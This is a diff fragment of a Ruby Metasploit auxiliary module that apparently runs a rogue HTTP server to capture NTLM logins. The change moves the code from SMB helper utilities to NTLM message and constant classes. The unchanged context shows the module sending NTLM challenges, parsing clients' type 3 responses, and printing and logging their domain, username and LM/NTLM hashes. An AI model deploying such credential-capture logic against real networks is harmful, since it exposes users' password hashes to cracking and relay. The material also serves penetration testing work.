@@ -11,11 +11,12 @@
 
 require 'msf/core'
 
-require 'rex/proto/smb/constants'
-CONST = Rex::Proto::SMB::Constants
+require 'rex/proto/ntlm/constants'
 
-require 'rex/proto/smb/utils'
-UTILS = Rex::Proto::SMB::Utils
+NTLM_CONST = Rex::Proto::NTLM::Constants
+
+require 'rex/proto/ntlm/message'
+MESSAGE = Rex::Proto::NTLM::Message
 
 class Metasploit3 < Msf::Auxiliary
 
@@ -110,13 +111,13 @@ class Metasploit3 < Msf::Auxiliary
 			end
 
 			response = create_response(401, "Unauthorized")
-			chalhash = UTILS.process_type1_message(hash,@challenge,domain,server,dnsname,dnsdomain)
+			chalhash = MESSAGE.process_type1_message(hash,@challenge,domain,server,dnsname,dnsdomain)
 			response.headers['WWW-Authenticate'] = "NTLM " + chalhash
 			return response
 
 		#if the message is a type 3 message, then we have our creds
 		elsif(message[8,1] == "\x03")
-			domain,user,host,lm_hash,ntlm_hash = UTILS.process_type3_message(hash)
+			domain,user,host,lm_hash,ntlm_hash = MESSAGE.process_type3_message(hash)
 			print_status("#{cli.peerhost}: #{domain}\\#{user} #{lm_hash}:#{ntlm_hash} on #{host}")
 
 			if(datastore['LOGFILE'])
@@ -165,12 +166,12 @@ class Metasploit3 < Msf::Auxiliary
 		reqflags = message[12,4]
 		reqflags = reqflags.unpack("V").first
 
-		if((reqflags & CONST::NEGOTIATE_DOMAIN) == CONST::NEGOTIATE_DOMAIN)
+		if((reqflags & NTLM_CONST::NEGOTIATE_DOMAIN) == NTLM_CONST::NEGOTIATE_DOMAIN)
 			dom_len = message[16,2].unpack('v')[0].to_i
 			dom_off = message[20,2].unpack('v')[0].to_i
 			domain = message[dom_off,dom_len].to_s
 		end
-		if((reqflags & CONST::NEGOTIATE_WORKSTATION) == CONST::NEGOTIATE_WORKSTATION)
+		if((reqflags & NTLM_CONST::NEGOTIATE_WORKSTATION) == NTLM_CONST::NEGOTIATE_WORKSTATION)
 			wor_len = message[24,2].unpack('v')[0].to_i
 			wor_off = message[28,2].unpack('v')[0].to_i
 			workstation = message[wor_off,wor_len].to_s
